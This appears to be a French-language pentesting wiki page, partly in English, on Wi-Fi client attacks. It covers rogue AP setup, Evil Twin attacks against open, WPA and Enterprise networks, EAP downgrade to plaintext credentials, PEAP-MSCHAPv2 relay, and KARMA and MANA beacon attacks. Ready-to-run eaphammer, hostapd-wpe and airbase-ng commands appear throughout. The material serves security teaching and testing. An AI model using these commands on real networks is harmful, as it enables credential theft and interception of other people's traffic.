## Théorie des attaques sur le client

### Sélection du réseau et itinérance

- Le protocole 802.11 définit comment une station rejoint un Extended Service Set (ESS) mais ne précise pas les critères de sélection d'un ESS ni d'un access point (AP) à l'intérieur de celui-ci.
- Les stations peuvent effectuer de l'itinérance entre des AP partageant le même ESSID, conservant la connectivité à travers un bâtiment ou une zone.
- Le protocole exige l'authentification de la station envers l'ESS mais n'impose pas l'authentification de l'AP envers la station.

### Listes de réseaux préférés (PNL)

- Les stations stockent l'ESSID de chaque réseau sans fil auquel elles se connectent dans leur Preferred Network List (PNL), ainsi que les détails de configuration spécifiques au réseau.
- Le PNL est utilisé pour se connecter automatiquement aux réseaux connus, améliorant l'expérience utilisateur en simplifiant le processus de connexion.

### Scan passif

- Les AP émettent périodiquement des trames beacon, annonçant leur présence et leurs fonctionnalités, y compris l'ESSID de l'AP sauf si la diffusion est désactivée.
- Lors d'un scan passif, les stations écoutent les trames beacon. Si l'ESSID d'un beacon correspond à une entrée du PNL de la station, la station peut se connecter automatiquement à cet AP.
- La connaissance du PNL d'un appareil permet une exploitation potentielle en imitant l'ESSID d'un réseau connu, trompant l'appareil pour qu'il se connecte à un AP malveillant (rogue AP).

### Scan actif

- Le scan actif implique que les stations envoient des probe requests pour découvrir les AP à proximité et leurs caractéristiques.
- Les directed probe requests ciblent un ESSID spécifique, aidant à détecter si un réseau particulier est à portée, même s'il est caché.
- Les broadcast probe requests ont un champ SSID nul et sont envoyées à tous les AP à proximité, permettant à la station de vérifier la présence d'un réseau préféré sans divulguer le contenu de son PNL.

## AP simple avec redirection vers Internet

Avant d'expliquer comment réaliser des attaques plus complexes, il va être expliqué **comment** simplement **créer** un **AP** et **rediriger** son **trafic** vers une interface connectée **à** l'**Internet**.

En utilisant `ifconfig -a` vérifiez que l'interface wlan pour créer l'AP et l'interface connectée à l'Internet sont présentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Créer le fichier de configuration `/etc/dnsmasq.conf` :
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Ensuite **set IPs** et **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Ensuite **démarrez** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Créez un fichier de configuration `hostapd.conf` :
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Arrêter les processus gênants**, activer **monitor mode**, et **démarrer hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Transfert et redirection
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Une attaque Evil Twin exploite la façon dont les clients WiFi reconnaissent les réseaux, en s'appuyant principalement sur le nom du réseau (ESSID) sans exiger que la base station (access point) s'authentifie auprès du client. Points clés :

- **Difficulté de différenciation** : Les appareils ont du mal à distinguer entre les access points légitimes et les rogue access points lorsqu'ils partagent le même ESSID et le même type de chiffrement. Dans la pratique, les réseaux utilisent souvent plusieurs access points avec le même ESSID pour étendre la couverture de façon transparente.
- **Itinérance client et manipulation de connexion** : Le protocole 802.11 permet aux appareils de roam entre les access points au sein du même ESS. Les attaquants peuvent exploiter cela en incitant un appareil à se déconnecter de sa base station (access point) actuelle et à se connecter à une rogue access point. Cela peut être réalisé en offrant un signal plus fort ou en perturbant la connexion à l'access point légitime via des méthodes comme deauthentication packets ou jamming.
- **Difficultés d'exécution** : Réussir une attaque Evil Twin dans des environnements avec plusieurs access points bien placés peut être compliqué. Deauthenticating un seul access point légitime conduit souvent l'appareil à se connecter à un autre access point légitime, à moins que l'attaquant ne puisse deauthenticate tous les access points à proximité ou placer stratégiquement le rogue access point.

Vous pouvez créer un Open Evil Twin très basique (sans capacités pour router le trafic vers Internet) en faisant :
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Vous pouvez aussi créer un Evil Twin en utilisant **eaphammer** (notez que pour créer des evil twins avec eaphammer l'interface **ne doit PAS être** en **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou en utilisant Airgeddon : `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Veuillez noter que, par défaut, si un ESSID dans le PNL est enregistré comme protégé par WPA, l'appareil ne se connectera pas automatiquement à un Open evil Twin. Vous pouvez essayer de DoS le vrai AP et espérer que l'utilisateur se connectera manuellement à votre Open evil Twin, ou vous pouvez DoS le vrai AP et utiliser un WPA Evil Twin pour capturer le handshake (avec cette méthode vous ne pourrez pas laisser la victime se connecter à vous car vous ne connaissez pas le PSK, mais vous pouvez capturer le handshake et essayer de le cracker).

_Certains OS et AV avertiront l'utilisateur que se connecter à un réseau Open est dangereux..._

### WPA/WPA2 Evil Twin

Vous pouvez créer un **Evil Twin utilisant WPA/2** et si les appareils sont configurés pour se connecter à ce SSID avec WPA/2, ils vont essayer de se connecter. Toutefois, **pour compléter le 4-way-handshake** vous devez aussi **connaître** le **mot de passe** que le client va utiliser. Si vous **ne le connaissez pas**, la **connexion ne sera pas établie**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Pour comprendre ces attaques, je recommande de lire au préalable la brève [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Utilisation de hostapd-wpe**

`hostapd-wpe` a besoin d'un fichier de **configuration** pour fonctionner. Pour **automatiser** la génération de ces configurations, vous pouvez utiliser [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (téléchargez le fichier python dans _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Dans le fichier de configuration, vous pouvez sélectionner de nombreux éléments différents tels que ssid, channel, user files, cret/key, dh parameters, wpa version et auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Utilisation de EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Par défaut, EAPHammer propose ces authentication methods (notez GTC comme la première à tenter d'obtenir plaintext passwords, puis l'utilisation de auth methods plus robustes) :
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Ceci est la méthodologie par défaut pour éviter de longs temps de connexion. Cependant, vous pouvez aussi spécifier au serveur les méthodes d'authentification de la plus faible à la plus forte :
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### Quand les clients ne valident pas le certificat RADIUS (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **en clair** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Un NetNTLMv2 craqué donne des identifiants Wi‑Fi/AD réutilisables ; GTC fournit immédiatement le mot de passe en clair.

#### Relayer PEAP-MSCHAPv2 au lieu de craquer (wpa_sycophant + hostapd-mana)

- For machine accounts with uncrackable random passwords, abuse **MSCHAPv2 relay**: run `hostapd-mana` as the Evil Twin, forwarding the MSCHAPv2 exchange to `wpa_sycophant`, which simultaneously connects to the legitimate AP. Successful relay grants authenticated Wi‑Fi without recovering the password.
- Use builds that support the target security level (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF prevents deauth coercion, so wait for voluntary client associations.

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## Attaque KARMA, MANA, Loud MANA et Known beacons

### Listes blanches/noires ESSID et MAC

Différents types de Media Access Control Filter Lists (MFACLs) et leurs modes correspondants ainsi que leurs effets sur le comportement d'un rogue Access Point (AP) :

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Cette méthode permet à **un attacker de créer un malicious access point (AP) qui répond à toutes les probe requests** provenant de devices cherchant à se connecter à des réseaux. Cette technique **trompe les devices en les faisant se connecter à l'AP de l'attacker** en imitant les réseaux que les devices recherchent. Une fois qu'un device envoie une connection request à ce rogue AP, la connexion s'établit, amenant le device à se connecter par erreur au réseau de l'attacker.

### MANA

Ensuite, les devices ont commencé à ignorer les réponses réseau peu fiables, réduisant l'efficacité de l'original karma attack. Cependant, une nouvelle méthode, connue sous le nom de MANA attack, a été introduite par Ian de Villiers et Dominic White. Cette méthode implique que le rogue AP **capture les Preferred Network Lists (PNL) des devices en répondant à leurs broadcast probe requests** avec des noms de réseau (SSIDs) précédemment stockés par les devices. Cette attaque sophistiquée contourne les protections contre l'original karma attack en exploitant la façon dont les devices mémorisent et priorisent les réseaux connus.

La MANA attack fonctionne en surveillant à la fois les directed and broadcast probe requests provenant des devices. Pour les directed requests, elle enregistre le MAC address du device et le nom de réseau demandé, ajoutant ces informations à une liste. Lorsqu'une broadcast request est reçue, l'AP répond avec des informations correspondant à l'un des réseaux présents dans la liste du device, incitant le device à se connecter au rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Une **Loud MANA attack** est une stratégie avancée utilisée lorsque les appareils n'utilisent pas de directed probing ou lorsque leurs Preferred Network Lists (PNL) sont inconnues de l'attaquant. Elle repose sur le principe que **les appareils situés dans la même zone sont susceptibles de partager certains noms de réseau dans leurs PNLs**. Au lieu de répondre de façon sélective, cette attaque diffuse des probe responses pour chaque nom de réseau (ESSID) trouvé dans les PNLs combinées de tous les appareils observés. Cette approche large augmente la probabilité qu'un appareil reconnaisse un réseau familier et tente de se connecter au rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Lorsque l'**Loud MANA attack** ne suffit pas, l'**Known Beacon attack** propose une autre approche. Cette méthode **brute-forces le processus de connexion en simulant un AP qui répond à n'importe quel nom de réseau, en parcourant une liste d'ESSIDs potentiels** issue d'une wordlist. Cela simule la présence de nombreux réseaux, dans l'espoir de faire correspondre un ESSID dans le PNL de la victime, déclenchant une tentative de connexion vers l'AP fabriqué. L'attaque peut être amplifiée en la combinant avec l'option `--loud` pour une tentative plus agressive de piéger des appareils.

Eaphammer a implémenté cette attaque en tant que MANA attack où tous les ESSIDs contenus dans une liste sont diffusés (vous pouvez aussi combiner ceci avec `--loud` pour créer une Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

L'**Known Beacon Burst attack** implique la diffusion en rafale de beacon frames pour chaque ESSID répertorié dans un file. Cela crée un environnement dense de réseaux factices, augmentant fortement la probabilité que des appareils se connectent au rogue AP, surtout lorsqu'il est combiné avec une MANA attack. Cette technique exploite la vitesse et le volume pour saturer les mécanismes de sélection de réseau des appareils.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** est un protocole permettant à des appareils de se connecter directement entre eux via le Wi-Fi sans nécessiter un point d'accès sans fil traditionnel. Cette capacité est intégrée dans divers appareils de l'Internet des objets (IoT), tels que les imprimantes et les téléviseurs, facilitant la communication directe appareil-à-appareil. Une caractéristique notable de Wi-Fi Direct est qu'un appareil endosse le rôle d'un point d'accès, connu sous le nom de group owner, pour gérer la connexion.

La sécurité des connexions Wi-Fi Direct est assurée via **Wi-Fi Protected Setup (WPS)**, qui prend en charge plusieurs méthodes d'appairage sécurisé, notamment :

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Ces méthodes, en particulier PIN entry, sont exposées aux mêmes vulnérabilités que WPS dans les réseaux Wi-Fi traditionnels, ce qui en fait des cibles pour des vecteurs d'attaque similaires.

### EvilDirect Hijacking

**EvilDirect Hijacking** est une attaque spécifique à Wi-Fi Direct. Elle reprend le concept d'une attaque Evil Twin mais cible les connexions Wi-Fi Direct. Dans ce scénario, un attaquant se fait passer pour le group owner légitime afin de tromper les appareils et les amener à se connecter à une entité malveillante. Cette méthode peut être exécutée à l'aide d'outils comme `airbase-ng` en spécifiant le canal, l'ESSID et l'adresse MAC de l'appareil usurpé :

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Jeter un œil à [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (connexion via Facebook et imitation de WPA dans des captive portals)

{{#include ../../banners/hacktricks-training.md}}
